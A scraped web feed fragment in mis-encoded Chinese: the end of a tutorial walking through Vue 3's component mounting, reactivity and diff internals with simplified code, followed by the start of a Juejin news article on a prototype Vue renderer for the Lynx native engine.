<p>ç®€åŒ–ä¸ºï¼š</p>
<ul>
<li>å¦‚æœæ˜¯ <strong>DOM å…ƒç´  vnode</strong> â†’ æŒ‚è½½/æ›´æ–°</li>
<li>å¦‚æœæ˜¯ <strong>ç»„ä»¶ vnode</strong> â†’ åˆ›å»ºç»„ä»¶å®ä¾‹ã€æŒ‚è½½ã€æ¸²æŸ“å­æ ‘</li>
</ul>
<h2 data-id="heading-5">5ã€ç»„ä»¶å®ä¾‹åˆ›å»º</h2>
<p>å½“æ¸²æŸ“ç»„ä»¶æ—¶ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">processComponent</span>(<span class="hljs-params">n1, n2, container, parentComponent, anchor</span>) {
  <span class="hljs-title function_">mountComponent</span>(n2, container, parentComponent, anchor)
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">mountComponent</span>(<span class="hljs-params">vnode, container, parentComponent, anchor</span>) {
  <span class="hljs-keyword">const</span> instance = <span class="hljs-title function_">createComponentInstance</span>(vnode, parentComponent)
  <span class="hljs-title function_">setupComponent</span>(instance)
  <span class="hljs-title function_">setupRenderEffect</span>(instance, container, anchor)
}
</code></pre>
<ul>
<li>processComponent å¤„ç†ç»„ä»¶</li>
<li>mountComponent æŒ‚è½½ç»„ä»¶
<ul>
<li>createComponentInstance åˆ›å»ºç»„ä»¶å®ä¾‹</li>
<li>setupComponent åˆ›å»ºç»„ä»¶å¯¹è±¡</li>
</ul>
</li>
</ul>
<p>createComponentInstanceï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createComponentInstance</span>(<span class="hljs-params">vnode, parent</span>) {
  <span class="hljs-keyword">const</span> instance = {
    vnode,
    parent,
    <span class="hljs-attr">proxy</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">ctx</span>: {},
    <span class="hljs-attr">props</span>: {},
    <span class="hljs-attr">attrs</span>: {},
    <span class="hljs-attr">slots</span>: {},
    <span class="hljs-attr">setupState</span>: {},
    <span class="hljs-attr">isMounted</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">subTree</span>: <span class="hljs-literal">null</span>
  }
  <span class="hljs-keyword">return</span> instance
}
</code></pre>
<p>å®ä¾‹ä¿å­˜åŸºç¡€ä¿¡æ¯ï¼Œè¿˜æ²¡è¿è¡Œ setupã€‚</p>
<h2 data-id="heading-6">6ã€ setupComponentï¼ˆåˆå§‹åŒ–ç»„ä»¶ï¼‰</h2>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setupComponent</span>(<span class="hljs-params">instance</span>) {
  <span class="hljs-title function_">initProps</span>(instance, vnode.<span class="hljs-property">props</span>)
  <span class="hljs-title function_">initSlots</span>(instance, vnode.<span class="hljs-property">children</span>)
  <span class="hljs-title function_">setupStatefulComponent</span>(instance)
}
</code></pre>
<p>å†…éƒ¨ä¼šæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">const</span> { setup } = <span class="hljs-title class_">Component</span>
<span class="hljs-keyword">if</span> (setup) {
  <span class="hljs-keyword">const</span> setupResult = <span class="hljs-title function_">setup</span>(props, ctx)
  <span class="hljs-title function_">handleSetupResult</span>(instance, setupResult)
}
</code></pre>
<p>â€‹<strong>setup è¿”å›å€¼</strong>â€‹ï¼š</p>
<ul>
<li>è¿”å›å¯¹è±¡ â†’ ä½œä¸ºå“åº”å¼çŠ¶æ€ state</li>
<li>è¿”å›å‡½æ•° â†’ render å‡½æ•°</li>
</ul>
<p>æœ€ç»ˆè®©ç»„ä»¶æ‹¥æœ‰ <code>instance.render</code>ã€‚</p>
<h2 data-id="heading-7">7ã€åˆ›å»ºå“åº”å¼çŠ¶æ€</h2>
<p>Vue3 çš„å“åº”å¼æ¥è‡ª <code>reactivity</code> åŒ…ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> })
</code></pre>
<p>åº•å±‚æ˜¯ <code>Proxy</code> æ‹¦æˆª getter/setterï¼š</p>
<ul>
<li>getterï¼šæ”¶é›†ä¾èµ–</li>
<li>setterï¼šè§¦å‘ä¾èµ–æ›´æ–°</li>
</ul>
<p>ä¾èµ–ç®¡ç†æ ¸å¿ƒæ˜¯ â€‹<strong>effect / track / trigger</strong>â€‹ã€‚</p>
<h2 data-id="heading-8">8ã€ setupRenderEffect ä¸é¦–æ¬¡æ¸²æŸ“</h2>
<p>åˆ›å»ºæ¸²æŸ“å™¨å‰¯ä½œç”¨ï¼Œå¹¶è°ƒåº¦ç»„ä»¶æŒ‚è½½å’Œå¼‚æ­¥æ›´æ–°ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setupRenderEffect</span>(<span class="hljs-params">instance, container, anchor</span>) {
  instance.<span class="hljs-property">update</span> = <span class="hljs-title function_">effect</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">componentEffect</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (!instance.<span class="hljs-property">isMounted</span>) {
      <span class="hljs-keyword">const</span> subTree = (instance.<span class="hljs-property">subTree</span> = instance.<span class="hljs-property">render</span>.<span class="hljs-title function_">call</span>(proxy))
      <span class="hljs-title function_">patch</span>(<span class="hljs-literal">null</span>, subTree, container, instance, anchor)
      instance.<span class="hljs-property">isMounted</span> = <span class="hljs-literal">true</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// æ›´æ–°æ›´æ–°é€»è¾‘</span>
    }
  }, {
    <span class="hljs-attr">scheduler</span>: queueJob
  })
}
</code></pre>
<p>è¿™é‡Œï¼š</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ª <strong>å“åº”å¼ effect</strong></li>
<li>ç¬¬ä¸€æ¬¡æ‰§è¡Œ render å¾—åˆ° subTree</li>
<li>patch å­æ ‘åˆ° DOM</li>
</ul>
<blockquote>
<p><code>effect</code> + <code>scheduler</code> å®ç°å¼‚æ­¥æ›´æ–°ã€‚</p>
</blockquote>
<h2 data-id="heading-9">9ã€vnode-&gt; çœŸå® DOMï¼ˆDOM mountï¼‰</h2>
<p>å½“ patch åˆ°çœŸæ­£çš„ DOM æ—¶ï¼Œèµ°çš„æ˜¯ element åˆ†æ”¯ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">processElement</span>(<span class="hljs-params">...</span>) {
  <span class="hljs-keyword">if</span> (!n1) {
    <span class="hljs-title function_">mountElement</span>(vnode, container)
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">patchElement</span>(n1, n2)
  }
}
</code></pre>
<p>mountElement</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">mountElement</span>(<span class="hljs-params">vnode, container</span>) {
  <span class="hljs-keyword">const</span> el = (vnode.<span class="hljs-property">el</span> = <span class="hljs-title function_">hostCreateElement</span>(vnode.<span class="hljs-property">type</span>))
  <span class="hljs-comment">// props</span>
  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> props) {
    <span class="hljs-title function_">hostPatchProp</span>(el, key, <span class="hljs-literal">null</span>, props[key])
  }
  <span class="hljs-comment">// children</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> children === <span class="hljs-string">'string'</span>) {
    <span class="hljs-title function_">hostSetElementText</span>(el, children)
  } <span class="hljs-keyword">else</span> {
    children.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> <span class="hljs-title function_">patch</span>(<span class="hljs-literal">null</span>, c, el))
  }
  <span class="hljs-title function_">hostInsert</span>(el, container)
}
</code></pre>
<h2 data-id="heading-10">10ã€æ›´æ–° &amp; Diff ç®—æ³•</h2>
<p>å½“å“åº”å¼çŠ¶æ€æ”¹å˜ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">state.<span class="hljs-property">count</span>++
</code></pre>
<p>è§¦å‘ setter â†’ <code>trigger</code>ï¼š</p>
<ul>
<li>å°† effect æ”¾å…¥æ›´æ–°é˜Ÿåˆ—</li>
<li>å¼‚æ­¥æ‰§è¡Œ scheduler</li>
<li>è°ƒç”¨ instance.update å†æ¬¡ patch</li>
</ul>
<p>æ›´æ–°é˜¶æ®µï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title function_">patchElement</span>(n1, n2)
</code></pre>
<p>æ ¸å¿ƒé€»è¾‘ï¼š</p>
<ol>
<li>props diff</li>
<li>children diff</li>
<li><strong>unkeyed/keyed diff</strong> ç®—æ³•ï¼ˆæœ€å°åŒ–ç§»åŠ¨ï¼‰</li>
</ol>
<blockquote>
<p>å…·ä½“è§ <code>patchChildren</code> å’Œ <code>patchKeyedChildren</code>ã€‚</p>
</blockquote>
<h2 data-id="heading-11">æ•´ä½“æ ¸å¿ƒå¯¹è±¡å…³ç³»æ¶æ„</h2>
<pre><code class="hljs language-Plain" lang="Plain">App
 â””â”€ vnode(root)
     â””â”€ ComponentInstance
         â”œâ”€ props / slots
         â”œâ”€ setupState
         â””â”€ render() -&gt; subTree
             â””â”€ vnode tree
                 â””â”€ DOM nodes
</code></pre>
<p>å“åº”å¼ä¾èµ–ç»“æ„ï¼š</p>
<pre><code class="hljs language-Plain" lang="Plain">reactive state
 â”œâ”€ effects[]
 â””â”€ track -&gt; effect
              â””â”€ scheduler -&gt; patch
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue åŸç”Ÿæ¸²æŸ“çœŸè¦æ¥äº†ï¼ŸLynxå¼•æ“é¦–æ¬¡è·‘é€šVue]]></title>    <link>https://juejin.cn/post/7589932422654869540</link>    <guid>https://juejin.cn/post/7589932422654869540</guid>    <pubDate>2026-01-02T15:44:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654869540" data-draft-id="7589932422654853156" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue åŸç”Ÿæ¸²æŸ“çœŸè¦æ¥äº†ï¼ŸLynxå¼•æ“é¦–æ¬¡è·‘é€šVue"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-02T15:44:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°å°è§"/> <meta itemprop="url" content="https://juejin.cn/user/606586151371054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue åŸç”Ÿæ¸²æŸ“çœŸè¦æ¥äº†ï¼ŸLynxå¼•æ“é¦–æ¬¡è·‘é€šVue
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586151371054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°å°è§
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T15:44:11.000Z" title="Fri Jan 02 2026 15:44:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue åŸç”Ÿæ¸²æŸ“çœŸè¦æ¥äº†ï¼ŸLynxå¼•æ“é¦–æ¬¡è·‘é€šVue</h2>
<blockquote>
<p><strong>â€œè¿™ä¸€æ¬¡ï¼ŒVue ç»ˆäºèƒ½åœ¨ç§»åŠ¨ç«¯è·‘å‡ºåŸç”Ÿæ€§èƒ½äº†ã€‚â€</strong></p>
</blockquote>
<p><strong>æœ€æ–°åŠ¨æ€</strong>ï¼šä¸€ä½å‰ç«¯å·¥ç¨‹å¸ˆåœ¨48å°æ—¶å†…ï¼ŒæˆåŠŸå°†Vue 3çš„å“åº”å¼ç³»ç»Ÿä¸å­—èŠ‚è·³åŠ¨çš„Lynx.jså¼•æ“å¯¹æ¥ï¼Œå®ç°äº†é¦–ä¸ªVueè‡ªå®šä¹‰æ¸²æŸ“å™¨åŸå‹ã€‚è¿™æ ‡å¿—ç€è¿‘200ä¸‡Vueå¼€å‘è€…æœ‰æœ›ç›´æ¥ä½¿ç”¨ç†Ÿæ‚‰çš„<code>ref</code>ã€<code>&lt;SFC&gt;</code>ç­‰è¯­æ³•ï¼Œé©±åŠ¨iOS/Androidçš„åŸç”Ÿæ§ä»¶ï¼Œå‘Šåˆ«WebViewçš„æ€§èƒ½æŸç¼šã€‚</p>
<h4 data-id="heading-1">ä¸€ã€çªç ´æ€§è¿›å±•ï¼šVue å·²åœ¨ Lynx ä¸Šè·‘é€š</h4>
<p>è¿‘æ—¥ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆ <strong>@Shenqingchuan</strong> åœ¨ç¤¾äº¤å¹³å°å±•ç¤ºäº†ä»–çš„æˆæœï¼šä¸€ä¸ªåœ¨Lynxå¼•æ“ä¸Šè¿è¡Œçš„Vue 3è®¡æ•°å™¨Demoã€‚</p>
<p><img src="https://static.xxytime.top/2026/01/02/8b661e5f-3da3-4935-bb11-e9f6b63ec73e.jpg" alt="" loading="lazy"/></p>
<p>è¿™é¡¹åŸå‹éªŒè¯äº†æŠ€æœ¯å¯è¡Œæ€§ï¼Œä»–ä¹Ÿå…¬å¼€é‚€è¯·å¯¹ <strong>â€œVue Lynxâ€</strong> æ„Ÿå…´è¶£ä¸”ç†Ÿæ‚‰Vueæ ¸å¿ƒä»£ç ï¼ˆå°¤å…¶æ˜¯<code>runtime-core</code>ï¼‰çš„å¼€å‘è€…åŠ å…¥å…±å»ºã€‚</p>
<h4 data-id="heading-2">äºŒã€ä»€ä¹ˆæ˜¯ Lynx.jsï¼Ÿ</h4>
<p><strong>Lynx</strong> æ˜¯å­—èŠ‚è·³åŠ¨äºä»Šå¹´3æœˆå¼€æºçš„ä¸€æ¬¾<strong>é«˜æ€§èƒ½åŒçº¿ç¨‹åŸç”Ÿæ¸²æŸ“æ¡†æ¶</strong>ï¼Œå…¶æ ¸å¿ƒæ¶æ„ä¼˜åŠ¿åœ¨äºï¼š</p>
<p><img src="https://static.xxytime.top/2026/01/02/bf76f567-c0b0-41c5-a9e4-d4531726b655.jpg" alt="" loading="lazy"/></p>
<ul>
<li><strong>UIçº¿ç¨‹</strong>ï¼šä½¿ç”¨è‡ªç ”<code>PrimJS</code>é…åˆåŸºäºRustçš„<code>Rspack</code>ï¼ˆRspeedyï¼‰ï¼Œå®ç°æ¯«ç§’çº§é¦–å¸§ç›´å‡ºã€‚</li>
<li><strong>åå°çº¿ç¨‹</strong>ï¼šç‹¬ç«‹è¿è¡Œä¸šåŠ¡é€»è¾‘ã€ç½‘ç»œè¯·æ±‚ç­‰ï¼Œé¿å…å¤æ‚è®¡ç®—é˜»å¡ç•Œé¢ã€‚</li>
<li><strong>åŸç”Ÿæ¸²æŸ“</strong>ï¼šç›´æ¥è°ƒç”¨å¹³å°åŸç”Ÿæ§ä»¶ï¼Œå…¶æ¸²æŸ“æ€§èƒ½ä¸Flutterå±äºåŒä¸€æ¢¯é˜Ÿã€‚</li>
<li><strong>å®æˆ˜éªŒè¯</strong>ï¼šå·²å¹¿æ³›åº”ç”¨äºTikTokæœç´¢ã€ç›´æ’­ç­‰äº¿çº§æœˆæ´»ä¸šåŠ¡åœºæ™¯ã€‚</li>
</ul>
<p>Lynxæ¡†æ¶æœ¬èº«ä¿æŒä¸­ç«‹ï¼Œå…¶å›¢é˜Ÿæ›¾å…¬å¼€è¡¨ç¤ºæ¬¢è¿Vueç­‰æ¡†æ¶æ¥å…¥ï¼Œè¿™ä¸ºæ­¤æ¬¡â€œVue-Lynxâ€çš„åŸå‹è¯ç”Ÿæä¾›äº†åœŸå£¤ã€‚</p>
<h4 data-id="heading-3">ä¸‰ã€å®˜æ–¹ä¸ç¤¾åŒºçš„ç§¯æä¿¡å·</h4>
<p>æ­¤æ¬¡å°è¯•è¿…é€Ÿè·å¾—äº†æ¥è‡ªåŒæ–¹æ ¸å¿ƒäººç‰©çš„å…³æ³¨ï¼š</p>
<ul>
<li><strong>Lynxæ¶æ„å¸ˆ @Huxpro</strong> è½¬å‘å¹¶å¸®åŠ©æ‹›å‹Ÿåˆä½œè€…ã€‚</li>
<li><strong>Vueä½œè€… @youyuxi</strong> çš„è½¬å‘ï¼Œç›¸å½“äºç»™äºˆäº†é¡¹ç›®â€œå®˜æ–¹é»˜è®¸â€çš„è®¤è¯ã€‚</li>
</ul>
<p>æ­¤å¤–ï¼Œåœ¨æœ€è¿‘çš„React Advancedå¤§ä¼šä¸Šï¼Œ@Huxproé¢„å‘Šäº†<strong>lynx-ui</strong>ç»„ä»¶åº“å°†äº12æœˆå¼€æºï¼Œè¿™å°†ä¸ºä¸Šå±‚æ¡†æ¶æä¾›ä¸°å¯Œçš„åŸç”ŸUIç‰©æ–™ï¼Œè¿›ä¸€æ­¥å¤¯å®ç”Ÿæ€åŸºç¡€ã€‚</p>
<h4 data-id="heading-4">å››ã€æ ¸å¿ƒä¼˜åŠ¿ï¼šä¸ºä»€ä¹ˆè¿™æ¬¡å¯èƒ½æˆäº†ï¼Ÿ</h4>
<p>ç›¸æ¯”å†å²ä¸Šçš„ç±»ä¼¼å°è¯•ï¼ˆå¦‚Weexï¼‰ï¼Œæ­¤æ¬¡â€œVue + Lynxâ€çš„ç»„åˆåœ¨å¤šä¸ªå±‚é¢å…·å¤‡äº†æ›´åšå®çš„åŸºç¡€ï¼š</p>






























<table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Vue + Lynx æ–¹æ¡ˆ</th><th align="left">ä¼ ç»Ÿæ–¹æ¡ˆçš„å…¸å‹ç—›ç‚¹</th></tr></thead><tbody><tr><td align="left"><strong>æ¸²æŸ“æ€§èƒ½</strong></td><td align="left"><strong>åŒçº¿ç¨‹åŸç”Ÿæ§ä»¶</strong>ï¼Œæ— WebViewå±‚çº§</td><td align="left">WebViewæ˜“æ‰å¸§ã€å¡é¡¿</td></tr><tr><td align="left"><strong>å¼€å‘ä½“éªŒ</strong></td><td align="left">å®Œæ•´<strong>Vue 3ç»„åˆå¼API</strong>ï¼Œå¯¹æ¥ç°ä»£æ„å»ºå·¥å…·ï¼ˆVite/Rspeedyï¼‰</td><td align="left">éœ€å­¦ä¹ æ–°è¯­æ³•ï¼Œæˆ–æ„å»ºé€Ÿåº¦æ…¢</td></tr><tr><td align="left"><strong>è°ƒè¯•æ”¯æŒ</strong></td><td align="left">æ‹¥æœ‰<strong>Lynx DevTool</strong>ï¼Œæ”¯æŒçœŸæœºæ–­ç‚¹è°ƒè¯•</td><td align="left">è°ƒè¯•ä¾èµ–æ—¥å¿—ï¼Œä½“éªŒå·®</td></tr><tr><td align="left"><strong>æŠ€æœ¯éªŒè¯</strong></td><td align="left">åº•å±‚å¼•æ“å·²åœ¨<strong>10äº¿+DAU</strong>äº§å“ä¸­éªŒè¯</td><td align="left">å¤šä¸ºå®éªŒå®¤çº§åŸå‹ï¼Œç¼ºä¹å¤§è§„æ¨¡éªŒè¯</td></tr></tbody></table>
<h4 data-id="heading-5">äº”ã€ä»£ç ä¸€ç¥ï¼šVue Lynx åˆä½“éªŒ</h4>
<p>ä¸€ä¸ªç®€å•çš„Vueç»„ä»¶åœ¨Lynxç¯å¢ƒä¸‹å¯èƒ½è¿™æ ·ç¼–å†™ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- HelloLynx.vue --&gt;
&lt;script setup&gt;
import logo from './assets/lynx-logo.png'
import { ref } from 'vue'

const count = ref(0)
setInterval(() =&gt; count.value++, 1800)
&lt;/script&gt;

&lt;template&gt;
  &lt;view class="container"&gt;
    &lt;image :src="logo" class="logo" /&gt;
    &lt;text class="h1"&gt;Hello Vue-Lynx&lt;/text&gt;
    &lt;text class="p"&gt;åŒçº¿ç¨‹åŸç”Ÿæ¸²æŸ“ï¼Œé¦–å¸§ç›´å‡ºï¼&lt;/text&gt;
    &lt;button class="btn" @click="count++"&gt;ç‚¹æˆ‘ï¼š{{ count }}&lt;/button&gt;
  &lt;/view&gt;
&lt;/template&gt;
</code></pre>
<p>å…¶ä¸­çš„ <code>&lt;view&gt;</code>ã€<code>&lt;text&gt;</code>ã€<code>&lt;image&gt;</code> ç­‰æ ‡ç­¾å°†è¢«ç¼–è¯‘å¹¶æ˜ å°„ä¸º<strong>å¹³å°åŸç”Ÿç»„ä»¶</strong>ï¼Œè€Œå¼€å‘è€…ä½¿ç”¨çš„ä»ç„¶æ˜¯ç™¾åˆ†ä¹‹ç™¾æ ‡å‡†çš„Vueè¯­æ³•ã€‚</p>
<h4 data-id="heading-6">å…­ã€æŠ€æœ¯å®ç°è·¯å¾„å±•æœ›</h4>
<p>è¦å®ç°ç”Ÿäº§å¯ç”¨çš„â€œVue Lynxâ€ï¼Œè¿˜éœ€æ”»å…‹å‡ ä¸ªå…³é”®èŠ‚ç‚¹ï¼š</p>
<ol>
<li><strong>ç¼–è¯‘é“¾è·¯é€‚é…</strong>ï¼šéœ€è¦å¼€å‘æ–°çš„æ’ä»¶ï¼ˆå¦‚<code>vue-loader-rs</code>ï¼‰ï¼Œå°†Vue SFCç¼–è¯‘ä¸ºLynxåŒçº¿ç¨‹å¯è¯†åˆ«çš„ä»£ç åŒ…ï¼Œå¹¶ä¸¥æ ¼åŒºåˆ†UIçº¿ç¨‹ä¸åå°çº¿ç¨‹çš„èŒè´£ã€‚</li>
<li><strong>å®šåˆ¶è¿è¡Œæ—¶</strong>ï¼šåœ¨Vueæ ¸å¿ƒåº“ä¸­æ–°å¢ä¸€ä¸ª<code>vue/runtime-lynx</code>åŒ…ï¼Œå®ç°ä¸<code>PrimJS</code> APIå¯¹æ¥çš„èŠ‚ç‚¹æ“ä½œã€è°ƒåº¦å™¨å’Œäº‹ä»¶ç³»ç»Ÿã€‚</li>
<li><strong>çº¿ç¨‹è¾¹ç•Œç®¡ç†</strong>ï¼šå¯èƒ½é€šè¿‡æ‰©å±•SFCè¯­æ³•ï¼ˆå¦‚å¼•å…¥<code>&lt;script main&gt;</code>æ ‡ç­¾ï¼‰ï¼Œæˆ–åœ¨ç¼–è¯‘æ—¶è¿›è¡Œé™æ€åˆ†æï¼Œæ¥æ˜ç¡®ä»£ç çš„è¿è¡Œçº¿ç¨‹ï¼Œç¡®ä¿å¼€å‘è€…æ—¢èƒ½ç•…å¿«ç¼–ç åˆä¸è¿åæ¶æ„çº¦æŸã€‚</li>
</ol>
<h4 data-id="heading-7">ä¸ƒã€Vue Native ç”Ÿæ€è·¯çº¿å›¾</h4>
<p>ç›®å‰ï¼Œè®©Vueå¼€å‘ç§»åŠ¨åŸç”Ÿåº”ç”¨çš„æ–¹æ¡ˆå¹¶éå”¯ä¸€ï¼Œå¼€å‘è€…å¯æ ¹æ®éœ€æ±‚é€‰æ‹©ï¼š</p>








































